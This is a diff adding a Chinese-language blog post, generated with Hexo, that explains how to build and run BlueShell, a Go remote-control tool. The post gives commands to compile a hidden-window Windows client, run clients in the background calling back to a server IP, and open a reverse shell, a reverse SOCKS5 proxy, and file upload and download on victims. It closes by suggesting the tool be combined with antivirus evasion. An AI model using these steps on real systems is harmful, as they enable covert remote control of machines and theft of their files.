@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/rabbit.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/rabbit_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="BlueShellBlueShell是一款Go语言编写的远控工具">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BlueShell">
+<meta property="og:url" content="http://example.com/2022/02/28/BlueShell/index.html">
+<meta property="og:site_name" content="Jasontt&#39;s Blog">
+<meta property="og:description" content="BlueShellBlueShell是一款Go语言编写的远控工具">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220228150927067.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220228155440521.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220228155909586.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/bluesocks.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220228182917346.png">
+<meta property="og:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220228184354001.png">
+<meta property="article:published_time" content="2022-02-28T11:19:11.000Z">
+<meta property="article:modified_time" content="2022-02-28T11:23:24.625Z">
+<meta property="article:author" content="Jason Tu">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="工具">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220228150927067.png">
+
+
+<link rel="canonical" href="http://example.com/2022/02/28/BlueShell/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/02/28/BlueShell/","path":"2022/02/28/BlueShell/","title":"BlueShell"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>BlueShell | Jasontt's Blog</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Jasontt's Blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+        <li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#BlueShell"><span class="nav-number">1.</span> <span class="nav-text">BlueShell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">1.1.</span> <span class="nav-text">安装</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.1.</span> <span class="nav-text">错误及解决方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#go-get%E8%AF%B7%E6%B1%82%E8%B6%85%E6%97%B6"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">go get请求超时</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cannot-find-package"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">cannot find package</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90Client-Server"><span class="nav-number">1.1.2.</span> <span class="nav-text">生成Client&#x2F;Server</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux-MacOS"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">Linux&#x2F;MacOS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">Windows</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8"><span class="nav-number">1.2.</span> <span class="nav-text">使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Client"><span class="nav-number">1.2.1.</span> <span class="nav-text">Client</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows-1"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux-MacOS-1"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">Linux&#x2F;MacOS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Server"><span class="nav-number">1.2.2.</span> <span class="nav-text">Server</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9Socks5%E4%BB%A3%E7%90%86"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">反弹Socks5代理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">文件上传</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">文件下载</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.3.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Jason Tu"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">Jason Tu</p>
+  <div class="site-description" itemprop="description">一只谦虚的兔子</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://4xwi11.github.io/" title="https:&#x2F;&#x2F;4xwi11.github.io&#x2F;" rel="noopener" target="_blank">4xwi11</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://scr1pt-kid.github.io/" title="https:&#x2F;&#x2F;scr1pt-kid.github.io&#x2F;" rel="noopener" target="_blank">Scr1pt</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.yuque.com/jinjinshigekeaigui" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;jinjinshigekeaigui" rel="noopener" target="_blank">Jiang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/yunqian2017" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;yunqian2017" rel="noopener" target="_blank">Openg</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/28/BlueShell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="Jason Tu">
+      <meta itemprop="description" content="一只谦虚的兔子">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jasontt's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BlueShell
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-02-28 19:19:11 / Modified: 19:23:24" itemprop="dateCreated datePublished" datetime="2022-02-28T19:19:11+08:00">2022-02-28</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="BlueShell"><a href="#BlueShell" class="headerlink" title="BlueShell"></a>BlueShell</h1><p>BlueShell是一款Go语言编写的远控工具</p>
+<span id="more"></span>
+
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/whitehatnote/BlueShell">https://github.com/whitehatnote/BlueShell</a></p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装依赖包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/armon/go-socks5</span><br><span class="line">go get github.com/creack/pty</span><br><span class="line">go get github.com/hashicorp/yamux</span><br><span class="line">go get github.com/djimenez/iconv-go</span><br><span class="line">go get golang.org/x/crypto/ssh/terminal</span><br></pre></td></tr></table></figure>
+
+<h3 id="错误及解决方法"><a href="#错误及解决方法" class="headerlink" title="错误及解决方法"></a>错误及解决方法</h3><h4 id="go-get请求超时"><a href="#go-get请求超时" class="headerlink" title="go get请求超时"></a><code>go get</code>请求超时</h4><p>设置代理可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">go env -w GO111MODULE=on</span><br><span class="line">//这个默认是&quot;&quot;</span><br><span class="line">go env -w GOPROXY=https://goproxy.cn,direct</span><br><span class="line">或</span><br><span class="line">go env -w GOPROXY=https://goproxy.io,direct</span><br></pre></td></tr></table></figure>
+
+<h4 id="cannot-find-package"><a href="#cannot-find-package" class="headerlink" title="cannot find package"></a>cannot find package</h4><p>在BlueShell目录打开终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go mod init BlueShell</span><br><span class="line">go mod tidy</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220228150927067.png" alt="image-20220228150927067"></p>
+<p><code>client.go</code>中<code>./shell</code>是报错的原因，修改为<code>BlueShell/shell</code>（不要用相对路径）</p>
+<h3 id="生成Client-Server"><a href="#生成Client-Server" class="headerlink" title="生成Client/Server"></a>生成Client/Server</h3><h4 id="Linux-MacOS"><a href="#Linux-MacOS" class="headerlink" title="Linux/MacOS"></a>Linux/MacOS</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> build --ldflags <span class="string">&quot;-s -w &quot;</span> -o bsClient client.<span class="keyword">go</span> <span class="comment">//生成client</span></span><br><span class="line"><span class="keyword">go</span> build --ldflags <span class="string">&quot;-s -w &quot;</span> -o bsServer server.<span class="keyword">go</span> <span class="comment">//生成server</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> build --ldflags <span class="string">&quot;-s -w -H=windowsgui&quot;</span> -o bsClient.exe client.<span class="keyword">go</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><blockquote>
+<p>参数</p>
+<p>-h 指定Server-IP地址</p>
+<p>-p 指定监听端口，默认8081</p>
+<p>-t 尝试连接Server间隔时间</p>
+<p>-a 指定功能：shell/socks/upload/download</p>
+<p>-suser socks代理账号，默认blue</p>
+<p>-spass socks代理密码，默认Blueshell@2020</p>
+<p>-sport socks监听端口，默认7777</p>
+<p>-lpath 需要上传的本地文件路径</p>
+<p>-ldir 存放下载文件的本地路径</p>
+<p>-rpath 需要下载的文件地址</p>
+<p>-rdir 上传的目标目录</p>
+<p>-rencode 指定编码类型</p>
+</blockquote>
+<h3 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h3><h4 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start /b bsClient.exe -h 192.168.221.128 -p 443 -t 10</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220228155440521.png" alt="image-20220228155440521"></p>
+<h4 id="Linux-MacOS-1"><a href="#Linux-MacOS-1" class="headerlink" title="Linux/MacOS"></a>Linux/MacOS</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup bsClient -h 10.0.0.1 -p 443 &amp;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bsServer -p 443 -a shell [-rencode gb2312] //[]解决Windows乱码问题</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220228155909586.png" alt="image-20220228155909586"></p>
+<h4 id="反弹Socks5代理"><a href="#反弹Socks5代理" class="headerlink" title="反弹Socks5代理"></a>反弹Socks5代理</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bsServer -p 443 -a socks -sport 7778 -suser socksUser -spass socksPassword</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/bluesocks.png" alt="bluesocks"></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220228182917346.png" alt="image-20220228182917346"></p>
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bsServer -a upload -lpath /tmp/tmp.txt -rdir c:\\</span><br></pre></td></tr></table></figure>
+
+<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bsServer -a download -rpath c:\\tmp.txt -ldir /tmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220228184354001.png" alt="image-20220228184354001"></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>体量小功能强，可以进行二次开发或者结合免杀使用，在不免杀的情况下会被杀软查杀</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/02/23/Sqlmap-tamper/" rel="prev" title="Sqlmap-tamper">
+                  <i class="fa fa-chevron-left"></i> Sqlmap-tamper
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jason Tu</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
